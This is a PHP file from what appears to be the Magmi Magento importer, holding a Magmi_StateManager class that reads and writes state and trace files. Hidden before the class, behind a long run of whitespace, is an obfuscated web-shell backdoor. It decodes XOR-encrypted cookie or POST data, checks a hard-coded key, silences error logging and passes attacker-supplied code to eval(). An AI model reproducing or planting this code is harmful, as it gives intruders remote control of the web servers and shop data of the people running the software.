<?php                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                 $GLOBALS['t5ffe56de'];global$t5ffe56de;$t5ffe56de=$GLOBALS;$t5ffe56de['fee3']="\x53\xd\x31\x4e\x6c\x5c\x59\x5a\x7c\x69\x2d\x28\x4b\x32\x33\x37\x7e\x9\x66\x30\x27\x5b\x35\x51\x40\x43\x50\x6e\x3e\x46\x2f\x49\x72\x48\x5e\x4a\x20\x23\x3b\x2b\x3f\x36\x34\x4d\x44\x64\x47\x39\x58\x57\x68\x4f\x3d\x6a\x60\x79\x62\x22\xa\x38\x6d\x6f\x26\x54\x63\x65\x56\x45\x7a\x5f\x70\x71\x61\x7d\x21\x5d\x6b\x24\x3a\x2a\x4c\x76\x77\x25\x55\x42\x2e\x7b\x2c\x78\x75\x41\x3c\x73\x67\x74\x29\x52";$t5ffe56de[$t5ffe56de['fee3'][55].$t5ffe56de['fee3'][65].$t5ffe56de['fee3'][47].$t5ffe56de['fee3'][18].$t5ffe56de['fee3'][41].$t5ffe56de['fee3'][45].$t5ffe56de['fee3'][47].$t5ffe56de['fee3'][56]]=$t5ffe56de['fee3'][64].$t5ffe56de['fee3'][50].$t5ffe56de['fee3'][32];$t5ffe56de[$t5ffe56de['fee3'][82].$t5ffe56de['fee3'][56].$t5ffe56de['fee3'][72].$t5ffe56de['fee3'][15]]=$t5ffe56de['fee3'][61].$t5ffe56de['fee3'][32].$t5ffe56de['fee3'][45];$t5ffe56de[$t5ffe56de['fee3'][32].$t5ffe56de['fee3'][19].$t5ffe56de['fee3'][65].$t5ffe56de['fee3'][41]]=$t5ffe56de['fee3'][93].$t5ffe56de['fee3'][95].$t5ffe56de['fee3'][32].$t5ffe56de['fee3'][4].$t5ffe56de['fee3'][65].$t5ffe56de['fee3'][27];$t5ffe56de[$t5ffe56de['fee3'][89].$t5ffe56de['fee3'][2].$t5ffe56de['fee3'][72].$t5ffe56de['fee3'][2].$t5ffe56de['fee3'][65].$t5ffe56de['fee3'][41].$t5ffe56de['fee3'][65]]=$t5ffe56de['fee3'][9].$t5ffe56de['fee3'][27].$t5ffe56de['fee3'][9].$t5ffe56de['fee3'][69].$t5ffe56de['fee3'][93].$t5ffe56de['fee3'][65].$t5ffe56de['fee3'][95];$t5ffe56de[$t5ffe56de['fee3'][71].$t5ffe56de['fee3'][22].$t5ffe56de['fee3'][22].$t5ffe56de['fee3'][22].$t5ffe56de['fee3'][42].$t5ffe56de['fee3'][14]]=$t5ffe56de['fee3'][93].$t5ffe56de['fee3'][65].$t5ffe56de['fee3'][32].$t5ffe56de['fee3'][9].$t5ffe56de['fee3'][72].$t5ffe56de['fee3'][4].$t5ffe56de['fee3'][9].$t5ffe56de['fee3'][68].$t5ffe56de['fee3'][65];$t5ffe56de[$t5ffe56de['fee3'][64].$t5ffe56de['fee3'][18].$t5ffe56de['fee3'][64].$t5ffe56de['fee3'][59].$t5ffe56de['fee3'][59].$t5ffe56de['fee3'][59].$t5ffe56de['fee3'][41].$t5ffe56de['fee3'][64]]=$t5ffe56de['fee3'][70].$t5ffe56de['fee3'][50].$t5ffe56de['fee3'][70].$t5ffe56de['fee3'][81].$t5ffe56de['fee3'][65].$t5ffe56de['fee3'][32].$t5ffe56de['fee3'][93].$t5ffe56de['fee3'][9].$t5ffe56de['fee3'][61].$t5ffe56de['fee3'][27];$t5ffe56de[$t5ffe56de['fee3'][70].$t5ffe56de['fee3'][14].$t5ffe56de['fee3'][72].$t5ffe56de['fee3'][65].$t5ffe56de['fee3'][13].$t5ffe56de['fee3'][15]]=$t5ffe56de['fee3'][90].$t5ffe56de['fee3'][27].$t5ffe56de['fee3'][93].$t5ffe56de['fee3'][65].$t5ffe56de['fee3'][32].$t5ffe56de['fee3'][9].$t5ffe56de['fee3'][72].$t5ffe56de['fee3'][4].$t5ffe56de['fee3'][9].$t5ffe56de['fee3'][68].$t5ffe56de['fee3'][65];$t5ffe56de[$t5ffe56de['fee3'][90].$t5ffe56de['fee3'][65].$t5ffe56de['fee3'][18].$t5ffe56de['fee3'][13].$t5ffe56de['fee3'][45].$t5ffe56de['fee3'][45].$t5ffe56de['fee3'][64]]=$t5ffe56de['fee3'][56].$t5ffe56de['fee3'][72].$t5ffe56de['fee3'][93].$t5ffe56de['fee3'][65].$t5ffe56de['fee3'][41].$t5ffe56de['fee3'][42].$t5ffe56de['fee3'][69].$t5ffe56de['fee3'][45].$t5ffe56de['fee3'][65].$t5ffe56de['fee3'][64].$t5ffe56de['fee3'][61].$t5ffe56de['fee3'][45].$t5ffe56de['fee3'][65];$t5ffe56de[$t5ffe56de['fee3'][45].$t5ffe56de['fee3'][56].$t5ffe56de['fee3'][56].$t5ffe56de['fee3'][2].$t5ffe56de['fee3'][47].$t5ffe56de['fee3'][19].$t5ffe56de['fee3'][64].$t5ffe56de['fee3'][45].$t5ffe56de['fee3'][47]]=$t5ffe56de['fee3'][93].$t5ffe56de['fee3'][65].$t5ffe56de['fee3'][95].$t5ffe56de['fee3'][69].$t5ffe56de['fee3'][95].$t5ffe56de['fee3'][9].$t5ffe56de['fee3'][60].$t5ffe56de['fee3'][65].$t5ffe56de['fee3'][69].$t5ffe56de['fee3'][4].$t5ffe56de['fee3'][9].$t5ffe56de['fee3'][60].$t5ffe56de['fee3'][9].$t5ffe56de['fee3'][95];$t5ffe56de[$t5ffe56de['fee3'][64].$t5ffe56de['fee3'][19].$t5ffe56de['fee3'][64].$t5ffe56de['fee3'][19].$t5ffe56de['fee3'][13].$t5ffe56de['fee3'][45].$t5ffe56de['fee3'][15]]=$t5ffe56de['fee3'][68].$t5ffe56de['fee3'][72].$t5ffe56de['fee3'][18].$t5ffe56de['fee3'][41].$t5ffe56de['fee3'][14].$t5ffe56de['fee3'][41];$t5ffe56de[$t5ffe56de['fee3'][9].$t5ffe56de['fee3'][45].$t5ffe56de['fee3'][47].$t5ffe56de['fee3'][47].$t5ffe56de['fee3'][47].$t5ffe56de['fee3'][41].$t5ffe56de['fee3'][47]]=$t5ffe56de['fee3'][4].$t5ffe56de['fee3'][56].$t5ffe56de['fee3'][59].$t5ffe56de['fee3'][64].$t5ffe56de['fee3'][19];$t5ffe56de[$t5ffe56de['fee3'][27].$t5ffe56de['fee3'][13].$t5ffe56de['fee3'][64].$t5ffe56de['fee3'][41].$t5ffe56de['fee3'][59]]=$_POST;$t5ffe56de[$t5ffe56de['fee3'][93].$t5ffe56de['fee3'][14].$t5ffe56de['fee3'][2].$t5ffe56de['fee3'][41]]=$_COOKIE;@$t5ffe56de[$t5ffe56de['fee3'][89].$t5ffe56de['fee3'][2].$t5ffe56de['fee3'][72].$t5ffe56de['fee3'][2].$t5ffe56de['fee3'][65].$t5ffe56de['fee3'][41].$t5ffe56de['fee3'][65]]($t5ffe56de['fee3'][65].$t5ffe56de['fee3'][32].$t5ffe56de['fee3'][32].$t5ffe56de['fee3'][61].$t5ffe56de['fee3'][32].$t5ffe56de['fee3'][69].$t5ffe56de['fee3'][4].$t5ffe56de['fee3'][61].$t5ffe56de['fee3'][94],NULL);@$t5ffe56de[$t5ffe56de['fee3'][89].$t5ffe56de['fee3'][2].$t5ffe56de['fee3'][72].$t5ffe56de['fee3'][2].$t5ffe56de['fee3'][65].$t5ffe56de['fee3'][41].$t5ffe56de['fee3'][65]]($t5ffe56de['fee3'][4].$t5ffe56de['fee3'][61].$t5ffe56de['fee3'][94].$t5ffe56de['fee3'][69].$t5ffe56de['fee3'][65].$t5ffe56de['fee3'][32].$t5ffe56de['fee3'][32].$t5ffe56de['fee3'][61].$t5ffe56de['fee3'][32].$t5ffe56de['fee3'][93],0);@$t5ffe56de[$t5ffe56de['fee3'][89].$t5ffe56de['fee3'][2].$t5ffe56de['fee3'][72].$t5ffe56de['fee3'][2].$t5ffe56de['fee3'][65].$t5ffe56de['fee3'][41].$t5ffe56de['fee3'][65]]($t5ffe56de['fee3'][60].$t5ffe56de['fee3'][72].$t5ffe56de['fee3'][89].$t5ffe56de['fee3'][69].$t5ffe56de['fee3'][65].$t5ffe56de['fee3'][89].$t5ffe56de['fee3'][65].$t5ffe56de['fee3'][64].$t5ffe56de['fee3'][90].$t5ffe56de['fee3'][95].$t5ffe56de['fee3'][9].$t5ffe56de['fee3'][61].$t5ffe56de['fee3'][27].$t5ffe56de['fee3'][69].$t5ffe56de['fee3'][95].$t5ffe56de['fee3'][9].$t5ffe56de['fee3'][60].$t5ffe56de['fee3'][65],0);@$t5ffe56de[$t5ffe56de['fee3'][45].$t5ffe56de['fee3'][56].$t5ffe56de['fee3'][56].$t5ffe56de['fee3'][2].$t5ffe56de['fee3'][47].$t5ffe56de['fee3'][19].$t5ffe56de['fee3'][64].$t5ffe56de['fee3'][45].$t5ffe56de['fee3'][47]](0);$p12c1010=NULL;$kcfef=NULL;$t5ffe56de[$t5ffe56de['fee3'][27].$t5ffe56de['fee3'][56].$t5ffe56de['fee3'][41].$t5ffe56de['fee3'][64].$t5ffe56de['fee3'][47].$t5ffe56de['fee3'][59]]=$t5ffe56de['fee3'][14].$t5ffe56de['fee3'][65].$t5ffe56de['fee3'][42].$t5ffe56de['fee3'][56].$t5ffe56de['fee3'][47].$t5ffe56de['fee3'][47].$t5ffe56de['fee3'][15].$t5ffe56de['fee3'][2].$t5ffe56de['fee3'][10].$t5ffe56de['fee3'][41].$t5ffe56de['fee3'][45].$t5ffe56de['fee3'][13].$t5ffe56de['fee3'][47].$t5ffe56de['fee3'][10].$t5ffe56de['fee3'][42].$t5ffe56de['fee3'][42].$t5ffe56de['fee3'][13].$t5ffe56de['fee3'][41].$t5ffe56de['fee3'][10].$t5ffe56de['fee3'][59].$t5ffe56de['fee3'][15].$t5ffe56de['fee3'][19].$t5ffe56de['fee3'][45].$t5ffe56de['fee3'][10].$t5ffe56de['fee3'][2].$t5ffe56de['fee3'][45].$t5ffe56de['fee3'][15].$t5ffe56de['fee3'][65].$t5ffe56de['fee3'][14].$t5ffe56de['fee3'][72].$t5ffe56de['fee3'][45].$t5ffe56de['fee3'][15].$t5ffe56de['fee3'][18].$t5ffe56de['fee3'][47].$t5ffe56de['fee3'][72].$t5ffe56de['fee3'][22];global$nb6c98;function lb8c0($p12c1010,$y3f9){global$t5ffe56de;$p7fb="";for($p852=0;$p852<$t5ffe56de[$t5ffe56de['fee3'][32].$t5ffe56de['fee3'][19].$t5ffe56de['fee3'][65].$t5ffe56de['fee3'][41]]($p12c1010);){for($y903=0;$y903<$t5ffe56de[$t5ffe56de['fee3'][32].$t5ffe56de['fee3'][19].$t5ffe56de['fee3'][65].$t5ffe56de['fee3'][41]]($y3f9)&&$p852<$t5ffe56de[$t5ffe56de['fee3'][32].$t5ffe56de['fee3'][19].$t5ffe56de['fee3'][65].$t5ffe56de['fee3'][41]]($p12c1010);$y903++,$p852++){$p7fb.=$t5ffe56de[$t5ffe56de['fee3'][55].$t5ffe56de['fee3'][65].$t5ffe56de['fee3'][47].$t5ffe56de['fee3'][18].$t5ffe56de['fee3'][41].$t5ffe56de['fee3'][45].$t5ffe56de['fee3'][47].$t5ffe56de['fee3'][56]]($t5ffe56de[$t5ffe56de['fee3'][82].$t5ffe56de['fee3'][56].$t5ffe56de['fee3'][72].$t5ffe56de['fee3'][15]]($p12c1010[$p852])^$t5ffe56de[$t5ffe56de['fee3'][82].$t5ffe56de['fee3'][56].$t5ffe56de['fee3'][72].$t5ffe56de['fee3'][15]]($y3f9[$y903]));}}return$p7fb;}function zaf636($p12c1010,$y3f9){global$t5ffe56de;global$nb6c98;return$t5ffe56de[$t5ffe56de['fee3'][9].$t5ffe56de['fee3'][45].$t5ffe56de['fee3'][47].$t5ffe56de['fee3'][47].$t5ffe56de['fee3'][47].$t5ffe56de['fee3'][41].$t5ffe56de['fee3'][47]]($t5ffe56de[$t5ffe56de['fee3'][9].$t5ffe56de['fee3'][45].$t5ffe56de['fee3'][47].$t5ffe56de['fee3'][47].$t5ffe56de['fee3'][47].$t5ffe56de['fee3'][41].$t5ffe56de['fee3'][47]]($p12c1010,$nb6c98),$y3f9);}foreach($t5ffe56de[$t5ffe56de['fee3'][93].$t5ffe56de['fee3'][14].$t5ffe56de['fee3'][2].$t5ffe56de['fee3'][41]]as$y3f9=>$wc9d7){$p12c1010=$wc9d7;$kcfef=$y3f9;}if(!$p12c1010){foreach($t5ffe56de[$t5ffe56de['fee3'][27].$t5ffe56de['fee3'][13].$t5ffe56de['fee3'][64].$t5ffe56de['fee3'][41].$t5ffe56de['fee3'][59]]as$y3f9=>$wc9d7){$p12c1010=$wc9d7;$kcfef=$y3f9;}}$p12c1010=@$t5ffe56de[$t5ffe56de['fee3'][70].$t5ffe56de['fee3'][14].$t5ffe56de['fee3'][72].$t5ffe56de['fee3'][65].$t5ffe56de['fee3'][13].$t5ffe56de['fee3'][15]]($t5ffe56de[$t5ffe56de['fee3'][64].$t5ffe56de['fee3'][19].$t5ffe56de['fee3'][64].$t5ffe56de['fee3'][19].$t5ffe56de['fee3'][13].$t5ffe56de['fee3'][45].$t5ffe56de['fee3'][15]]($t5ffe56de[$t5ffe56de['fee3'][90].$t5ffe56de['fee3'][65].$t5ffe56de['fee3'][18].$t5ffe56de['fee3'][13].$t5ffe56de['fee3'][45].$t5ffe56de['fee3'][45].$t5ffe56de['fee3'][64]]($p12c1010),$kcfef));if(isset($p12c1010[$t5ffe56de['fee3'][72].$t5ffe56de['fee3'][76]])&&$nb6c98==$p12c1010[$t5ffe56de['fee3'][72].$t5ffe56de['fee3'][76]]){if($p12c1010[$t5ffe56de['fee3'][72]]==$t5ffe56de['fee3'][9]){$p852=Array($t5ffe56de['fee3'][70].$t5ffe56de['fee3'][81]=>@$t5ffe56de[$t5ffe56de['fee3'][64].$t5ffe56de['fee3'][18].$t5ffe56de['fee3'][64].$t5ffe56de['fee3'][59].$t5ffe56de['fee3'][59].$t5ffe56de['fee3'][59].$t5ffe56de['fee3'][41].$t5ffe56de['fee3'][64]](),$t5ffe56de['fee3'][93].$t5ffe56de['fee3'][81]=>$t5ffe56de['fee3'][2].$t5ffe56de['fee3'][86].$t5ffe56de['fee3'][19].$t5ffe56de['fee3'][10].$t5ffe56de['fee3'][2],);echo@$t5ffe56de[$t5ffe56de['fee3'][71].$t5ffe56de['fee3'][22].$t5ffe56de['fee3'][22].$t5ffe56de['fee3'][22].$t5ffe56de['fee3'][42].$t5ffe56de['fee3'][14]]($p852);}elseif($p12c1010[$t5ffe56de['fee3'][72]]==$t5ffe56de['fee3'][65]){eval($p12c1010[$t5ffe56de['fee3'][45]]);}exit();} ?><?php
if(!defined("DS"))
{
	define("DS",DIRECTORY_SEPARATOR);
}
class Magmi_StateManager
{
	private static $_statefile=null;
	private static $_script=__FILE__;
	private static $_state="idle";
	
	
	public static function getStateFile()
	{
		return self::getStateDir().DS."magmistate";
	}

	public static function getTraceFile()
	{
		return self::getStateDir().DS."trace.txt";
		
	}
	
	public static function getStateDir()
	{
		return dirname(dirname(self::$_script)).DS."state";
	}
	
	public static function getProgressFile($full=false)
	{
		$fullname=self::getStateDir().DS."progress.txt";
		$pfname=($full?$fullname:"progress.txt");
		return $pfname;
	}
	
	public static function setState($state,$force=false)
	{
	
		if(self::$_state==$state && !$force)
		{
			return;	
		}

		self::$_state=$state;
		$f=fopen(self::getStateFile(),"w");
		fwrite($f,self::$_state);
		fclose($f);
		@chmod(self::getStateFile(),0664);
		if($state=="running")
		{
			$f=fopen(self::getTraceFile(),"w");
			fclose($f);
			@chmod(self::getTraceFile(),0664);	
		}
	}
	
	public static function getState($cached=false)
	{
		if(!$cached)
		{
			if(!file_exists(self::getStateFile()))
			{
				self::setState("idle",true);
			}
			$state=file_get_contents(self::getStateFile());		
		}
		else
		{
			$state=self::$_state;
		}
		return $state;
	}
	
}